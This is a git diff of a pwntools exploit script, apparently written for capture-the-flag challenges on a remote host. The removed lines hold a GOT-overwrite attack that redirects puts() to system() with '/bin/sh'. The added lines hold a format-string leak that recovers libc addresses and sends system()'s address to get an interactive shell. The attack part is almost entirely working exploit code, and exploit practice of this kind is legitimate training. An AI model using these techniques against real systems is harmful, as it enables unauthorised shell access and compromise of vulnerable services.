@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template word_storage.elf '--port=11671' '--host=109.233.56.90'
+# $ pwn template look_at_me.elf '--port=11631' '--host=109.233.56.90'
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('word_storage.elf')
+exe = context.binary = ELF('look_at_me.elf')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -13,7 +13,7 @@ exe = context.binary = ELF('word_storage.elf')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
 host = args.HOST or '109.233.56.90'
-port = int(args.PORT or 11671)
+port = int(args.PORT or 11631)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -47,44 +47,35 @@ continue
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-
-# 0x404020		.got.plt:		puts()
-# 0x404028		.got.plt:		system()
-# 0x4040A0		.bss:			data[0]
-
-puts_GOT_ADDR = 0x404020
-system_GOT_ADDR = 0x404028
-data_ADDR = 0x4040A0
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
 
 io = start()
 
-io.recvuntil(b'> ')
-io.sendline(b'1')	# store
-io.recvuntil(b'Enter index: ')
-io.sendline(b'0')	# index = 0
-io.recvuntil(b'Enter word: ')
-io.send(b'/bin/sh')	# /bin/sh
+io.recvuntil(b'Payload: ')
+pl = b'\x25\x70\x70'        # %pp
+io.sendline(pl*13)          # %pp%pp%pp%pp...
 
-io.recvuntil(b'> ')
-io.sendline(b'2')	# get
-io.recvuntil(b'Enter index: ')
-io.sendline( str((data_ADDR - system_GOT_ADDR)//-8).encode() )	# get system_ADDR
+io.recvuntil(b'Hmmm...\n')
+data = io.recvline()[:-2]   # 0x7ff..11p0x7ff..22p0x7ff..33p0x7ff..44p...
+data = data.split(b'p')     # [0x7ff..11, 7ff..22, 7ff..33, 7ff..44, ...]
 
-addrs = io.recvuntil(b'\x0a\x0aChoose')
-addrs = addrs.split(b'\x0a\x0aChoose')[0]
-system_ADDR = addrs+b'\x00\x00'	# make system_ADDR
+PRINTF_addr = int(data[12].decode(), 16)
+FGETS_addr = int(data[11].decode(), 16)
+STRTOL_addr = int(data[10].decode(), 16)
+# print("printf", hex(PRINTF_addr))
+# print("fgets", hex(FGETS_addr))
+# print("strtol", hex(STRTOL_addr))
 
-io.recvuntil(b'> ')
-io.sendline(b'1')	# store
-io.recvuntil(b'Enter index: ')
-io.sendline( str((data_ADDR - puts_GOT_ADDR)//-8).encode() )	# instead puts_ADDR
-io.recvuntil(b'Enter word: ')
-io.send(system_ADDR)
+PRINTF_offs = 0x064e10
+LIBC_BASE = PRINTF_addr - PRINTF_offs
+SYSTEM_offs = 0x055410
 
-io.recvuntil(b'> ')
-io.sendline(b'2')	# get
-io.recvuntil(b'Enter index: ')
-io.sendline(b'0')	# index = 0
+io.recvuntil(b'Address (as hex): ')
+io.sendline( hex(LIBC_BASE + SYSTEM_offs)[2:].encode() )
 
 io.interactive()
 
